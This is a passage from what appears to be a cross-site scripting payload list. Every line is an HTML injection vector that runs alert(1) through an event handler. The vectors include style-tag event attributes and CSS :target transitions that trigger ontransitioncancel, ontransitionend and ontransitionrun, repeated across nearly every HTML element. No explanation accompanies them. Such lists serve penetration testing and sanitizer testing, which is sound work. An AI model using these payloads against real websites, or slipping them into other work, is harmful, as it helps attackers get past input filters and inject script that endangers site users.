4273 | <style onclick="alert(1)">test</style>
4274 | <style oncontextmenu="alert(1)">test</style>
4275 | <style oncopy="alert(1)" contenteditable>test</style>
4276 | <style oncut="alert(1)" contenteditable>test</style>
4277 | <style ondblclick="alert(1)">test</style>
4278 | <style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>
4279 | <style onkeydown="alert(1)" contenteditable>test</style>
4280 | <style onkeypress="alert(1)" contenteditable>test</style>
4281 | <style onkeyup="alert(1)" contenteditable>test</style>
4282 | <style onload=alert(1)></style>
4283 | <style onmousedown="alert(1)">test</style>
4284 | <style onmouseenter="alert(1)">test</style>
4285 | <style onmouseleave="alert(1)">test</style>
4286 | <style onmousemove="alert(1)">test</style>
4287 | <style onmouseout="alert(1)">test</style>
4288 | <style onmouseover="alert(1)">test</style>
4289 | <style onmouseup="alert(1)">test</style>
4290 | <style onpaste="alert(1)" contenteditable>test</style>
4291 | <style onreadystatechange=alert(1)></style>
4292 | <style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=alert(1)></a>
4293 | <style>:target {color: red;}</style><abbr id=x style="transition:color 10s" ontransitioncancel=alert(1)></abbr>
4294 | <style>:target {color: red;}</style><acronym id=x style="transition:color 10s" ontransitioncancel=alert(1)></acronym>
4295 | <style>:target {color: red;}</style><address id=x style="transition:color 10s" ontransitioncancel=alert(1)></address>
4296 | <style>:target {color: red;}</style><applet id=x style="transition:color 10s" ontransitioncancel=alert(1)></applet>
4297 | <style>:target {color: red;}</style><area id=x style="transition:color 10s" ontransitioncancel=alert(1)></area>
4298 | <style>:target {color: red;}</style><article id=x style="transition:color 10s" ontransitioncancel=alert(1)></article>
4299 | <style>:target {color: red;}</style><aside id=x style="transition:color 10s" ontransitioncancel=alert(1)></aside>
4300 | <style>:target {color: red;}</style><audio id=x style="transition:color 10s" ontransitioncancel=alert(1)></audio>
4301 | <style>:target {color: red;}</style><b id=x style="transition:color 10s" ontransitioncancel=alert(1)></b>
4302 | <style>:target {color: red;}</style><base id=x style="transition:color 10s" ontransitioncancel=alert(1)></base>
4303 | <style>:target {color: red;}</style><basefont id=x style="transition:color 10s" ontransitioncancel=alert(1)></basefont>
4304 | <style>:target {color: red;}</style><bdi id=x style="transition:color 10s" ontransitioncancel=alert(1)></bdi>
4305 | <style>:target {color: red;}</style><bdo id=x style="transition:color 10s" ontransitioncancel=alert(1)></bdo>
4306 | <style>:target {color: red;}</style><bgsound id=x style="transition:color 10s" ontransitioncancel=alert(1)></bgsound>
4307 | <style>:target {color: red;}</style><big id=x style="transition:color 10s" ontransitioncancel=alert(1)></big>
4308 | <style>:target {color: red;}</style><blink id=x style="transition:color 10s" ontransitioncancel=alert(1)></blink>
4309 | <style>:target {color: red;}</style><blockquote id=x style="transition:color 10s" ontransitioncancel=alert(1)></blockquote>
4310 | <style>:target {color: red;}</style><body id=x style="transition:color 10s" ontransitioncancel=alert(1)></body>
4311 | <style>:target {color: red;}</style><br id=x style="transition:color 10s" ontransitioncancel=alert(1)></br>
4312 | <style>:target {color: red;}</style><button id=x style="transition:color 10s" ontransitioncancel=alert(1)></button>
4313 | <style>:target {color: red;}</style><canvas id=x style="transition:color 10s" ontransitioncancel=alert(1)></canvas>
4314 | <style>:target {color: red;}</style><caption id=x style="transition:color 10s" ontransitioncancel=alert(1)></caption>
4315 | <style>:target {color: red;}</style><center id=x style="transition:color 10s" ontransitioncancel=alert(1)></center>
4316 | <style>:target {color: red;}</style><cite id=x style="transition:color 10s" ontransitioncancel=alert(1)></cite>
4317 | <style>:target {color: red;}</style><code id=x style="transition:color 10s" ontransitioncancel=alert(1)></code>
4318 | <style>:target {color: red;}</style><col id=x style="transition:color 10s" ontransitioncancel=alert(1)></col>
4319 | <style>:target {color: red;}</style><colgroup id=x style="transition:color 10s" ontransitioncancel=alert(1)></colgroup>
4320 | <style>:target {color: red;}</style><command id=x style="transition:color 10s" ontransitioncancel=alert(1)></command>
4321 | <style>:target {color: red;}</style><content id=x style="transition:color 10s" ontransitioncancel=alert(1)></content>
4322 | <style>:target {color: red;}</style><data id=x style="transition:color 10s" ontransitioncancel=alert(1)></data>
4323 | <style>:target {color: red;}</style><datalist id=x style="transition:color 10s" ontransitioncancel=alert(1)></datalist>
4324 | <style>:target {color: red;}</style><dd id=x style="transition:color 10s" ontransitioncancel=alert(1)></dd>
4325 | <style>:target {color: red;}</style><del id=x style="transition:color 10s" ontransitioncancel=alert(1)></del>
4326 | <style>:target {color: red;}</style><details id=x style="transition:color 10s" ontransitioncancel=alert(1)></details>
4327 | <style>:target {color: red;}</style><dfn id=x style="transition:color 10s" ontransitioncancel=alert(1)></dfn>
4328 | <style>:target {color: red;}</style><dialog id=x style="transition:color 10s" ontransitioncancel=alert(1)></dialog>
4329 | <style>:target {color: red;}</style><dir id=x style="transition:color 10s" ontransitioncancel=alert(1)></dir>
4330 | <style>:target {color: red;}</style><div id=x style="transition:color 10s" ontransitioncancel=alert(1)></div>
4331 | <style>:target {color: red;}</style><dl id=x style="transition:color 10s" ontransitioncancel=alert(1)></dl>
4332 | <style>:target {color: red;}</style><dt id=x style="transition:color 10s" ontransitioncancel=alert(1)></dt>
4333 | <style>:target {color: red;}</style><element id=x style="transition:color 10s" ontransitioncancel=alert(1)></element>
4334 | <style>:target {color: red;}</style><em id=x style="transition:color 10s" ontransitioncancel=alert(1)></em>
4335 | <style>:target {color: red;}</style><embed id=x style="transition:color 10s" ontransitioncancel=alert(1)></embed>
4336 | <style>:target {color: red;}</style><fieldset id=x style="transition:color 10s" ontransitioncancel=alert(1)></fieldset>
4337 | <style>:target {color: red;}</style><figcaption id=x style="transition:color 10s" ontransitioncancel=alert(1)></figcaption>
4338 | <style>:target {color: red;}</style><figure id=x style="transition:color 10s" ontransitioncancel=alert(1)></figure>
4339 | <style>:target {color: red;}</style><font id=x style="transition:color 10s" ontransitioncancel=alert(1)></font>
4340 | <style>:target {color: red;}</style><footer id=x style="transition:color 10s" ontransitioncancel=alert(1)></footer>
4341 | <style>:target {color: red;}</style><form id=x style="transition:color 10s" ontransitioncancel=alert(1)></form>
4342 | <style>:target {color: red;}</style><frame id=x style="transition:color 10s" ontransitioncancel=alert(1)></frame>
4343 | <style>:target {color: red;}</style><frameset id=x style="transition:color 10s" ontransitioncancel=alert(1)></frameset>
4344 | <style>:target {color: red;}</style><h1 id=x style="transition:color 10s" ontransitioncancel=alert(1)></h1>
4345 | <style>:target {color: red;}</style><head id=x style="transition:color 10s" ontransitioncancel=alert(1)></head>
4346 | <style>:target {color: red;}</style><header id=x style="transition:color 10s" ontransitioncancel=alert(1)></header>
4347 | <style>:target {color: red;}</style><hgroup id=x style="transition:color 10s" ontransitioncancel=alert(1)></hgroup>
4348 | <style>:target {color: red;}</style><hr id=x style="transition:color 10s" ontransitioncancel=alert(1)></hr>
4349 | <style>:target {color: red;}</style><html id=x style="transition:color 10s" ontransitioncancel=alert(1)></html>
4350 | <style>:target {color: red;}</style><i id=x style="transition:color 10s" ontransitioncancel=alert(1)></i>
4351 | <style>:target {color: red;}</style><iframe id=x style="transition:color 10s" ontransitioncancel=alert(1)></iframe>
4352 | <style>:target {color: red;}</style><image id=x style="transition:color 10s" ontransitioncancel=alert(1)></image>
4353 | <style>:target {color: red;}</style><img id=x style="transition:color 10s" ontransitioncancel=alert(1)></img>
4354 | <style>:target {color: red;}</style><input id=x style="transition:color 10s" ontransitioncancel=alert(1)></input>
4355 | <style>:target {color: red;}</style><ins id=x style="transition:color 10s" ontransitioncancel=alert(1)></ins>
4356 | <style>:target {color: red;}</style><isindex id=x style="transition:color 10s" ontransitioncancel=alert(1)></isindex>
4357 | <style>:target {color: red;}</style><kbd id=x style="transition:color 10s" ontransitioncancel=alert(1)></kbd>
4358 | <style>:target {color: red;}</style><keygen id=x style="transition:color 10s" ontransitioncancel=alert(1)></keygen>
4359 | <style>:target {color: red;}</style><label id=x style="transition:color 10s" ontransitioncancel=alert(1)></label>
4360 | <style>:target {color: red;}</style><legend id=x style="transition:color 10s" ontransitioncancel=alert(1)></legend>
4361 | <style>:target {color: red;}</style><li id=x style="transition:color 10s" ontransitioncancel=alert(1)></li>
4362 | <style>:target {color: red;}</style><link id=x style="transition:color 10s" ontransitioncancel=alert(1)></link>
4363 | <style>:target {color: red;}</style><listing id=x style="transition:color 10s" ontransitioncancel=alert(1)></listing>
4364 | <style>:target {color: red;}</style><main id=x style="transition:color 10s" ontransitioncancel=alert(1)></main>
4365 | <style>:target {color: red;}</style><map id=x style="transition:color 10s" ontransitioncancel=alert(1)></map>
4366 | <style>:target {color: red;}</style><mark id=x style="transition:color 10s" ontransitioncancel=alert(1)></mark>
4367 | <style>:target {color: red;}</style><marquee id=x style="transition:color 10s" ontransitioncancel=alert(1)></marquee>
4368 | <style>:target {color: red;}</style><menu id=x style="transition:color 10s" ontransitioncancel=alert(1)></menu>
4369 | <style>:target {color: red;}</style><menuitem id=x style="transition:color 10s" ontransitioncancel=alert(1)></menuitem>
4370 | <style>:target {color: red;}</style><meta id=x style="transition:color 10s" ontransitioncancel=alert(1)></meta>
4371 | <style>:target {color: red;}</style><meter id=x style="transition:color 10s" ontransitioncancel=alert(1)></meter>
4372 | <style>:target {color: red;}</style><multicol id=x style="transition:color 10s" ontransitioncancel=alert(1)></multicol>
4373 | <style>:target {color: red;}</style><nav id=x style="transition:color 10s" ontransitioncancel=alert(1)></nav>
4374 | <style>:target {color: red;}</style><nextid id=x style="transition:color 10s" ontransitioncancel=alert(1)></nextid>
4375 | <style>:target {color: red;}</style><nobr id=x style="transition:color 10s" ontransitioncancel=alert(1)></nobr>
4376 | <style>:target {color: red;}</style><noembed id=x style="transition:color 10s" ontransitioncancel=alert(1)></noembed>
4377 | <style>:target {color: red;}</style><noframes id=x style="transition:color 10s" ontransitioncancel=alert(1)></noframes>
4378 | <style>:target {color: red;}</style><noscript id=x style="transition:color 10s" ontransitioncancel=alert(1)></noscript>
4379 | <style>:target {color: red;}</style><object id=x style="transition:color 10s" ontransitioncancel=alert(1)></object>
4380 | <style>:target {color: red;}</style><ol id=x style="transition:color 10s" ontransitioncancel=alert(1)></ol>
4381 | <style>:target {color: red;}</style><optgroup id=x style="transition:color 10s" ontransitioncancel=alert(1)></optgroup>
4382 | <style>:target {color: red;}</style><option id=x style="transition:color 10s" ontransitioncancel=alert(1)></option>
4383 | <style>:target {color: red;}</style><output id=x style="transition:color 10s" ontransitioncancel=alert(1)></output>
4384 | <style>:target {color: red;}</style><p id=x style="transition:color 10s" ontransitioncancel=alert(1)></p>
4385 | <style>:target {color: red;}</style><param id=x style="transition:color 10s" ontransitioncancel=alert(1)></param>
4386 | <style>:target {color: red;}</style><picture id=x style="transition:color 10s" ontransitioncancel=alert(1)></picture>
4387 | <style>:target {color: red;}</style><plaintext id=x style="transition:color 10s" ontransitioncancel=alert(1)></plaintext>
4388 | <style>:target {color: red;}</style><pre id=x style="transition:color 10s" ontransitioncancel=alert(1)></pre>
4389 | <style>:target {color: red;}</style><progress id=x style="transition:color 10s" ontransitioncancel=alert(1)></progress>
4390 | <style>:target {color: red;}</style><q id=x style="transition:color 10s" ontransitioncancel=alert(1)></q>
4391 | <style>:target {color: red;}</style><rb id=x style="transition:color 10s" ontransitioncancel=alert(1)></rb>
4392 | <style>:target {color: red;}</style><rp id=x style="transition:color 10s" ontransitioncancel=alert(1)></rp>
4393 | <style>:target {color: red;}</style><rt id=x style="transition:color 10s" ontransitioncancel=alert(1)></rt>
4394 | <style>:target {color: red;}</style><rtc id=x style="transition:color 10s" ontransitioncancel=alert(1)></rtc>
4395 | <style>:target {color: red;}</style><ruby id=x style="transition:color 10s" ontransitioncancel=alert(1)></ruby>
4396 | <style>:target {color: red;}</style><s id=x style="transition:color 10s" ontransitioncancel=alert(1)></s>
4397 | <style>:target {color: red;}</style><samp id=x style="transition:color 10s" ontransitioncancel=alert(1)></samp>
4398 | <style>:target {color: red;}</style><script id=x style="transition:color 10s" ontransitioncancel=alert(1)></script>
4399 | <style>:target {color: red;}</style><section id=x style="transition:color 10s" ontransitioncancel=alert(1)></section>
4400 | <style>:target {color: red;}</style><select id=x style="transition:color 10s" ontransitioncancel=alert(1)></select>
4401 | <style>:target {color: red;}</style><shadow id=x style="transition:color 10s" ontransitioncancel=alert(1)></shadow>
4402 | <style>:target {color: red;}</style><slot id=x style="transition:color 10s" ontransitioncancel=alert(1)></slot>
4403 | <style>:target {color: red;}</style><small id=x style="transition:color 10s" ontransitioncancel=alert(1)></small>
4404 | <style>:target {color: red;}</style><source id=x style="transition:color 10s" ontransitioncancel=alert(1)></source>
4405 | <style>:target {color: red;}</style><spacer id=x style="transition:color 10s" ontransitioncancel=alert(1)></spacer>
4406 | <style>:target {color: red;}</style><span id=x style="transition:color 10s" ontransitioncancel=alert(1)></span>
4407 | <style>:target {color: red;}</style><strike id=x style="transition:color 10s" ontransitioncancel=alert(1)></strike>
4408 | <style>:target {color: red;}</style><strong id=x style="transition:color 10s" ontransitioncancel=alert(1)></strong>
4409 | <style>:target {color: red;}</style><style id=x style="transition:color 10s" ontransitioncancel=alert(1)></style>
4410 | <style>:target {color: red;}</style><sub id=x style="transition:color 10s" ontransitioncancel=alert(1)></sub>
4411 | <style>:target {color: red;}</style><summary id=x style="transition:color 10s" ontransitioncancel=alert(1)></summary>
4412 | <style>:target {color: red;}</style><sup id=x style="transition:color 10s" ontransitioncancel=alert(1)></sup>
4413 | <style>:target {color: red;}</style><svg id=x style="transition:color 10s" ontransitioncancel=alert(1)></svg>
4414 | <style>:target {color: red;}</style><table id=x style="transition:color 10s" ontransitioncancel=alert(1)></table>
4415 | <style>:target {color: red;}</style><tbody id=x style="transition:color 10s" ontransitioncancel=alert(1)></tbody>
4416 | <style>:target {color: red;}</style><td id=x style="transition:color 10s" ontransitioncancel=alert(1)></td>
4417 | <style>:target {color: red;}</style><template id=x style="transition:color 10s" ontransitioncancel=alert(1)></template>
4418 | <style>:target {color: red;}</style><textarea id=x style="transition:color 10s" ontransitioncancel=alert(1)></textarea>
4419 | <style>:target {color: red;}</style><tfoot id=x style="transition:color 10s" ontransitioncancel=alert(1)></tfoot>
4420 | <style>:target {color: red;}</style><th id=x style="transition:color 10s" ontransitioncancel=alert(1)></th>
4421 | <style>:target {color: red;}</style><thead id=x style="transition:color 10s" ontransitioncancel=alert(1)></thead>
4422 | <style>:target {color: red;}</style><time id=x style="transition:color 10s" ontransitioncancel=alert(1)></time>
4423 | <style>:target {color: red;}</style><title id=x style="transition:color 10s" ontransitioncancel=alert(1)></title>
4424 | <style>:target {color: red;}</style><tr id=x style="transition:color 10s" ontransitioncancel=alert(1)></tr>
4425 | <style>:target {color: red;}</style><track id=x style="transition:color 10s" ontransitioncancel=alert(1)></track>
4426 | <style>:target {color: red;}</style><tt id=x style="transition:color 10s" ontransitioncancel=alert(1)></tt>
4427 | <style>:target {color: red;}</style><u id=x style="transition:color 10s" ontransitioncancel=alert(1)></u>
4428 | <style>:target {color: red;}</style><ul id=x style="transition:color 10s" ontransitioncancel=alert(1)></ul>
4429 | <style>:target {color: red;}</style><var id=x style="transition:color 10s" ontransitioncancel=alert(1)></var>
4430 | <style>:target {color: red;}</style><video id=x style="transition:color 10s" ontransitioncancel=alert(1)></video>
4431 | <style>:target {color: red;}</style><wbr id=x style="transition:color 10s" ontransitioncancel=alert(1)></wbr>
4432 | <style>:target {color: red;}</style><xmp id=x style="transition:color 10s" ontransitioncancel=alert(1)></xmp>
4433 | <style>:target {color:red;}</style><a id=x style="transition:color 1s" ontransitionend=alert(1)></a>
4434 | <style>:target {color:red;}</style><abbr id=x style="transition:color 1s" ontransitionend=alert(1)></abbr>
4435 | <style>:target {color:red;}</style><acronym id=x style="transition:color 1s" ontransitionend=alert(1)></acronym>
4436 | <style>:target {color:red;}</style><address id=x style="transition:color 1s" ontransitionend=alert(1)></address>
4437 | <style>:target {color:red;}</style><applet id=x style="transition:color 1s" ontransitionend=alert(1)></applet>
4438 | <style>:target {color:red;}</style><area id=x style="transition:color 1s" ontransitionend=alert(1)></area>
4439 | <style>:target {color:red;}</style><article id=x style="transition:color 1s" ontransitionend=alert(1)></article>
4440 | <style>:target {color:red;}</style><aside id=x style="transition:color 1s" ontransitionend=alert(1)></aside>
4441 | <style>:target {color:red;}</style><audio id=x style="transition:color 1s" ontransitionend=alert(1)></audio>
4442 | <style>:target {color:red;}</style><b id=x style="transition:color 1s" ontransitionend=alert(1)></b>
4443 | <style>:target {color:red;}</style><base id=x style="transition:color 1s" ontransitionend=alert(1)></base>
4444 | <style>:target {color:red;}</style><basefont id=x style="transition:color 1s" ontransitionend=alert(1)></basefont>
4445 | <style>:target {color:red;}</style><bdi id=x style="transition:color 1s" ontransitionend=alert(1)></bdi>
4446 | <style>:target {color:red;}</style><bdo id=x style="transition:color 1s" ontransitionend=alert(1)></bdo>
4447 | <style>:target {color:red;}</style><bgsound id=x style="transition:color 1s" ontransitionend=alert(1)></bgsound>
4448 | <style>:target {color:red;}</style><big id=x style="transition:color 1s" ontransitionend=alert(1)></big>
4449 | <style>:target {color:red;}</style><blink id=x style="transition:color 1s" ontransitionend=alert(1)></blink>
4450 | <style>:target {color:red;}</style><blockquote id=x style="transition:color 1s" ontransitionend=alert(1)></blockquote>
4451 | <style>:target {color:red;}</style><body id=x style="transition:color 1s" ontransitionend=alert(1)></body>
4452 | <style>:target {color:red;}</style><br id=x style="transition:color 1s" ontransitionend=alert(1)></br>
4453 | <style>:target {color:red;}</style><button id=x style="transition:color 1s" ontransitionend=alert(1)></button>
4454 | <style>:target {color:red;}</style><canvas id=x style="transition:color 1s" ontransitionend=alert(1)></canvas>
4455 | <style>:target {color:red;}</style><caption id=x style="transition:color 1s" ontransitionend=alert(1)></caption>
4456 | <style>:target {color:red;}</style><center id=x style="transition:color 1s" ontransitionend=alert(1)></center>
4457 | <style>:target {color:red;}</style><cite id=x style="transition:color 1s" ontransitionend=alert(1)></cite>
4458 | <style>:target {color:red;}</style><code id=x style="transition:color 1s" ontransitionend=alert(1)></code>
4459 | <style>:target {color:red;}</style><col id=x style="transition:color 1s" ontransitionend=alert(1)></col>
4460 | <style>:target {color:red;}</style><colgroup id=x style="transition:color 1s" ontransitionend=alert(1)></colgroup>
4461 | <style>:target {color:red;}</style><command id=x style="transition:color 1s" ontransitionend=alert(1)></command>
4462 | <style>:target {color:red;}</style><content id=x style="transition:color 1s" ontransitionend=alert(1)></content>
4463 | <style>:target {color:red;}</style><data id=x style="transition:color 1s" ontransitionend=alert(1)></data>
4464 | <style>:target {color:red;}</style><datalist id=x style="transition:color 1s" ontransitionend=alert(1)></datalist>
4465 | <style>:target {color:red;}</style><dd id=x style="transition:color 1s" ontransitionend=alert(1)></dd>
4466 | <style>:target {color:red;}</style><del id=x style="transition:color 1s" ontransitionend=alert(1)></del>
4467 | <style>:target {color:red;}</style><details id=x style="transition:color 1s" ontransitionend=alert(1)></details>
4468 | <style>:target {color:red;}</style><dfn id=x style="transition:color 1s" ontransitionend=alert(1)></dfn>
4469 | <style>:target {color:red;}</style><dialog id=x style="transition:color 1s" ontransitionend=alert(1)></dialog>
4470 | <style>:target {color:red;}</style><dir id=x style="transition:color 1s" ontransitionend=alert(1)></dir>
4471 | <style>:target {color:red;}</style><div id=x style="transition:color 1s" ontransitionend=alert(1)></div>
4472 | <style>:target {color:red;}</style><dl id=x style="transition:color 1s" ontransitionend=alert(1)></dl>
4473 | <style>:target {color:red;}</style><dt id=x style="transition:color 1s" ontransitionend=alert(1)></dt>
4474 | <style>:target {color:red;}</style><element id=x style="transition:color 1s" ontransitionend=alert(1)></element>
4475 | <style>:target {color:red;}</style><em id=x style="transition:color 1s" ontransitionend=alert(1)></em>
4476 | <style>:target {color:red;}</style><embed id=x style="transition:color 1s" ontransitionend=alert(1)></embed>
4477 | <style>:target {color:red;}</style><fieldset id=x style="transition:color 1s" ontransitionend=alert(1)></fieldset>
4478 | <style>:target {color:red;}</style><figcaption id=x style="transition:color 1s" ontransitionend=alert(1)></figcaption>
4479 | <style>:target {color:red;}</style><figure id=x style="transition:color 1s" ontransitionend=alert(1)></figure>
4480 | <style>:target {color:red;}</style><font id=x style="transition:color 1s" ontransitionend=alert(1)></font>
4481 | <style>:target {color:red;}</style><footer id=x style="transition:color 1s" ontransitionend=alert(1)></footer>
4482 | <style>:target {color:red;}</style><form id=x style="transition:color 1s" ontransitionend=alert(1)></form>
4483 | <style>:target {color:red;}</style><frame id=x style="transition:color 1s" ontransitionend=alert(1)></frame>
4484 | <style>:target {color:red;}</style><frameset id=x style="transition:color 1s" ontransitionend=alert(1)></frameset>
4485 | <style>:target {color:red;}</style><h1 id=x style="transition:color 1s" ontransitionend=alert(1)></h1>
4486 | <style>:target {color:red;}</style><head id=x style="transition:color 1s" ontransitionend=alert(1)></head>
4487 | <style>:target {color:red;}</style><header id=x style="transition:color 1s" ontransitionend=alert(1)></header>
4488 | <style>:target {color:red;}</style><hgroup id=x style="transition:color 1s" ontransitionend=alert(1)></hgroup>
4489 | <style>:target {color:red;}</style><hr id=x style="transition:color 1s" ontransitionend=alert(1)></hr>
4490 | <style>:target {color:red;}</style><html id=x style="transition:color 1s" ontransitionend=alert(1)></html>
4491 | <style>:target {color:red;}</style><i id=x style="transition:color 1s" ontransitionend=alert(1)></i>
4492 | <style>:target {color:red;}</style><iframe id=x style="transition:color 1s" ontransitionend=alert(1)></iframe>
4493 | <style>:target {color:red;}</style><image id=x style="transition:color 1s" ontransitionend=alert(1)></image>
4494 | <style>:target {color:red;}</style><img id=x style="transition:color 1s" ontransitionend=alert(1)></img>
4495 | <style>:target {color:red;}</style><input id=x style="transition:color 1s" ontransitionend=alert(1)></input>
4496 | <style>:target {color:red;}</style><ins id=x style="transition:color 1s" ontransitionend=alert(1)></ins>
4497 | <style>:target {color:red;}</style><isindex id=x style="transition:color 1s" ontransitionend=alert(1)></isindex>
4498 | <style>:target {color:red;}</style><kbd id=x style="transition:color 1s" ontransitionend=alert(1)></kbd>
4499 | <style>:target {color:red;}</style><keygen id=x style="transition:color 1s" ontransitionend=alert(1)></keygen>
4500 | <style>:target {color:red;}</style><label id=x style="transition:color 1s" ontransitionend=alert(1)></label>
4501 | <style>:target {color:red;}</style><legend id=x style="transition:color 1s" ontransitionend=alert(1)></legend>
4502 | <style>:target {color:red;}</style><li id=x style="transition:color 1s" ontransitionend=alert(1)></li>
4503 | <style>:target {color:red;}</style><link id=x style="transition:color 1s" ontransitionend=alert(1)></link>
4504 | <style>:target {color:red;}</style><listing id=x style="transition:color 1s" ontransitionend=alert(1)></listing>
4505 | <style>:target {color:red;}</style><main id=x style="transition:color 1s" ontransitionend=alert(1)></main>
4506 | <style>:target {color:red;}</style><map id=x style="transition:color 1s" ontransitionend=alert(1)></map>
4507 | <style>:target {color:red;}</style><mark id=x style="transition:color 1s" ontransitionend=alert(1)></mark>
4508 | <style>:target {color:red;}</style><marquee id=x style="transition:color 1s" ontransitionend=alert(1)></marquee>
4509 | <style>:target {color:red;}</style><menu id=x style="transition:color 1s" ontransitionend=alert(1)></menu>
4510 | <style>:target {color:red;}</style><menuitem id=x style="transition:color 1s" ontransitionend=alert(1)></menuitem>
4511 | <style>:target {color:red;}</style><meta id=x style="transition:color 1s" ontransitionend=alert(1)></meta>
4512 | <style>:target {color:red;}</style><meter id=x style="transition:color 1s" ontransitionend=alert(1)></meter>
4513 | <style>:target {color:red;}</style><multicol id=x style="transition:color 1s" ontransitionend=alert(1)></multicol>
4514 | <style>:target {color:red;}</style><nav id=x style="transition:color 1s" ontransitionend=alert(1)></nav>
4515 | <style>:target {color:red;}</style><nextid id=x style="transition:color 1s" ontransitionend=alert(1)></nextid>
4516 | <style>:target {color:red;}</style><nobr id=x style="transition:color 1s" ontransitionend=alert(1)></nobr>
4517 | <style>:target {color:red;}</style><noembed id=x style="transition:color 1s" ontransitionend=alert(1)></noembed>
4518 | <style>:target {color:red;}</style><noframes id=x style="transition:color 1s" ontransitionend=alert(1)></noframes>
4519 | <style>:target {color:red;}</style><noscript id=x style="transition:color 1s" ontransitionend=alert(1)></noscript>
4520 | <style>:target {color:red;}</style><object id=x style="transition:color 1s" ontransitionend=alert(1)></object>
4521 | <style>:target {color:red;}</style><ol id=x style="transition:color 1s" ontransitionend=alert(1)></ol>
4522 | <style>:target {color:red;}</style><optgroup id=x style="transition:color 1s" ontransitionend=alert(1)></optgroup>
4523 | <style>:target {color:red;}</style><option id=x style="transition:color 1s" ontransitionend=alert(1)></option>
4524 | <style>:target {color:red;}</style><output id=x style="transition:color 1s" ontransitionend=alert(1)></output>
4525 | <style>:target {color:red;}</style><p id=x style="transition:color 1s" ontransitionend=alert(1)></p>
4526 | <style>:target {color:red;}</style><param id=x style="transition:color 1s" ontransitionend=alert(1)></param>
4527 | <style>:target {color:red;}</style><picture id=x style="transition:color 1s" ontransitionend=alert(1)></picture>
4528 | <style>:target {color:red;}</style><plaintext id=x style="transition:color 1s" ontransitionend=alert(1)></plaintext>
4529 | <style>:target {color:red;}</style><pre id=x style="transition:color 1s" ontransitionend=alert(1)></pre>
4530 | <style>:target {color:red;}</style><progress id=x style="transition:color 1s" ontransitionend=alert(1)></progress>
4531 | <style>:target {color:red;}</style><q id=x style="transition:color 1s" ontransitionend=alert(1)></q>
4532 | <style>:target {color:red;}</style><rb id=x style="transition:color 1s" ontransitionend=alert(1)></rb>
4533 | <style>:target {color:red;}</style><rp id=x style="transition:color 1s" ontransitionend=alert(1)></rp>
4534 | <style>:target {color:red;}</style><rt id=x style="transition:color 1s" ontransitionend=alert(1)></rt>
4535 | <style>:target {color:red;}</style><rtc id=x style="transition:color 1s" ontransitionend=alert(1)></rtc>
4536 | <style>:target {color:red;}</style><ruby id=x style="transition:color 1s" ontransitionend=alert(1)></ruby>
4537 | <style>:target {color:red;}</style><s id=x style="transition:color 1s" ontransitionend=alert(1)></s>
4538 | <style>:target {color:red;}</style><samp id=x style="transition:color 1s" ontransitionend=alert(1)></samp>
4539 | <style>:target {color:red;}</style><script id=x style="transition:color 1s" ontransitionend=alert(1)></script>
4540 | <style>:target {color:red;}</style><section id=x style="transition:color 1s" ontransitionend=alert(1)></section>
4541 | <style>:target {color:red;}</style><select id=x style="transition:color 1s" ontransitionend=alert(1)></select>
4542 | <style>:target {color:red;}</style><shadow id=x style="transition:color 1s" ontransitionend=alert(1)></shadow>
4543 | <style>:target {color:red;}</style><slot id=x style="transition:color 1s" ontransitionend=alert(1)></slot>
4544 | <style>:target {color:red;}</style><small id=x style="transition:color 1s" ontransitionend=alert(1)></small>
4545 | <style>:target {color:red;}</style><source id=x style="transition:color 1s" ontransitionend=alert(1)></source>
4546 | <style>:target {color:red;}</style><spacer id=x style="transition:color 1s" ontransitionend=alert(1)></spacer>
4547 | <style>:target {color:red;}</style><span id=x style="transition:color 1s" ontransitionend=alert(1)></span>
4548 | <style>:target {color:red;}</style><strike id=x style="transition:color 1s" ontransitionend=alert(1)></strike>
4549 | <style>:target {color:red;}</style><strong id=x style="transition:color 1s" ontransitionend=alert(1)></strong>
4550 | <style>:target {color:red;}</style><style id=x style="transition:color 1s" ontransitionend=alert(1)></style>
4551 | <style>:target {color:red;}</style><sub id=x style="transition:color 1s" ontransitionend=alert(1)></sub>
4552 | <style>:target {color:red;}</style><summary id=x style="transition:color 1s" ontransitionend=alert(1)></summary>
4553 | <style>:target {color:red;}</style><sup id=x style="transition:color 1s" ontransitionend=alert(1)></sup>
4554 | <style>:target {color:red;}</style><svg id=x style="transition:color 1s" ontransitionend=alert(1)></svg>
4555 | <style>:target {color:red;}</style><table id=x style="transition:color 1s" ontransitionend=alert(1)></table>
4556 | <style>:target {color:red;}</style><tbody id=x style="transition:color 1s" ontransitionend=alert(1)></tbody>
4557 | <style>:target {color:red;}</style><td id=x style="transition:color 1s" ontransitionend=alert(1)></td>
4558 | <style>:target {color:red;}</style><template id=x style="transition:color 1s" ontransitionend=alert(1)></template>
4559 | <style>:target {color:red;}</style><textarea id=x style="transition:color 1s" ontransitionend=alert(1)></textarea>
4560 | <style>:target {color:red;}</style><tfoot id=x style="transition:color 1s" ontransitionend=alert(1)></tfoot>
4561 | <style>:target {color:red;}</style><th id=x style="transition:color 1s" ontransitionend=alert(1)></th>
4562 | <style>:target {color:red;}</style><thead id=x style="transition:color 1s" ontransitionend=alert(1)></thead>
4563 | <style>:target {color:red;}</style><time id=x style="transition:color 1s" ontransitionend=alert(1)></time>
4564 | <style>:target {color:red;}</style><title id=x style="transition:color 1s" ontransitionend=alert(1)></title>
4565 | <style>:target {color:red;}</style><tr id=x style="transition:color 1s" ontransitionend=alert(1)></tr>
4566 | <style>:target {color:red;}</style><track id=x style="transition:color 1s" ontransitionend=alert(1)></track>
4567 | <style>:target {color:red;}</style><tt id=x style="transition:color 1s" ontransitionend=alert(1)></tt>
4568 | <style>:target {color:red;}</style><u id=x style="transition:color 1s" ontransitionend=alert(1)></u>
4569 | <style>:target {color:red;}</style><ul id=x style="transition:color 1s" ontransitionend=alert(1)></ul>
4570 | <style>:target {color:red;}</style><var id=x style="transition:color 1s" ontransitionend=alert(1)></var>
4571 | <style>:target {color:red;}</style><video id=x style="transition:color 1s" ontransitionend=alert(1)></video>
4572 | <style>:target {color:red;}</style><wbr id=x style="transition:color 1s" ontransitionend=alert(1)></wbr>
4573 | <style>:target {color:red;}</style><xmp id=x style="transition:color 1s" ontransitionend=alert(1)></xmp>
4574 | <style>:target {transform: rotate(180deg);}</style><a id=x style="transition:transform 2s" ontransitionrun=alert(1)></a>
4575 | <style>:target {transform: rotate(180deg);}</style><abbr id=x style="transition:transform 2s" ontransitionrun=alert(1)></abbr>
